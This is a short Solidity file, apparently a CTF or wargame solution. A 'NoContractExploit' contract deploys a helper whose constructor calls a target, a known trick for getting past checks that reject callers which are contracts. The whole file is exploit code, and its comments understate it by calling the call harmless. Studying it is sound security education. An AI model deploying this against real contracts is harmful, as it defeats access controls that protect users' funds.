// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// This contract is named "Zero."
contract Zero {
    constructor(address _target) {
        // You can also write your code here, but in this case, it makes an empty external call to the _target address.
        // This call has no effect since there is no function signature provided.
        _target.call("");
    }
}

// Contract for the NoContractExploit.
contract NoContractExploit {
    // Address of the target contract.
    address public target;

    // Constructor to set the target contract address.
    constructor(address _target) {
        target = _target;
    }

    // Function to perform the exploit.
    function pwn() external {
        // Create an instance of the "Zero" contract and pass the target address as an argument.
        // This does not directly exploit the target but deploys an instance of "Zero" with the target address.
        new Zero(target);
    }
}